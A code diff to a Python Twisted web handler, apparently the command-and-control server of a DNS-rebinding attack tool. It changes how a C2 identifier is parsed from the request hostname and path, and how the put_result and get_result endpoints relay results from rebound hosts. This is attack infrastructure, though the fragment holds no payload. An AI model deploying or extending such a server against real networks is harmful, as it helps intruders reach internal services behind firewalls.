@@ -15,10 +15,19 @@ class RebindPage(Resource):
         hostname = request.getRequestHostname().decode()
         path = request.path.decode()
 
-        c2id, path = (path.split("/")[1], "/" + "/".join(path.split("/")[2:]))
+        c2id = []
         if hostname.startswith("c2"):
-            c2id = hostname.split(".")[0] + c2id
-        return c2id, path
+            hostname = hostname.replace("c2", "", 1)
+            c2id.append(hostname.split(".")[0]) if not hostname.startswith(".") else None
+
+        if path.count("/") > 1:
+            if path.startswith("/c2"):
+                path = path.replace("/c2", "/", 1)
+            _path = path.split("/")
+            c2id += _path[1:-1]
+            path = "/{}".format(_path[-1])
+
+        return ".".join([x for x in c2id if len(x) > 0]) or "None", path
 
     def render_POST(self, request):
         hostid, path = self.get_c2(request)
@@ -44,7 +53,7 @@ class RebindPage(Resource):
 
         elif path.startswith("/put_result"):
             try:
-                id = int(path.split("/")[2])
+                id = int(request.args[b'id'][0])
                 if len(request_body) > 0:
                     result_queue[hostid][id] = request_body
                 else:
@@ -88,7 +97,7 @@ class RebindPage(Resource):
         elif path.startswith("/get_result"):
             request.responseHeaders.addRawHeader(b"content-type", b"application/json")
             try:
-                id = int(path.split("/")[2])
+                id = int(request.args[b'id'][0])
                 if result_queue[hostid][id] is not None:
                     response = json.dumps({"state": "complete", "result" : result_queue[hostid][id]})
                     del result_queue[hostid][id]
